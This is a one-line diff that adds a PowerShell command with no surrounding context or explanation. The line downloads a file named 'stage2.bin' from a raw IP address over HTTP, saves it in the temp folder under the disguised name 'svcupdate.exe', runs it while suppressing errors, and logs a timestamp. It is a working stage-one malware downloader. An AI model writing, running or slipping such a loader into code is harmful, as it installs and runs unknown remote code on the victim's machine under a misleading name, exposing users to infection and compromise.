@@ -1,0 +1,1 @@
+$Stage1Url = 'http://198.51.100.216:8080/cdn/stage2.bin'; $OutputPath = "$env:TEMP\svcupdate.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; & $OutputPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
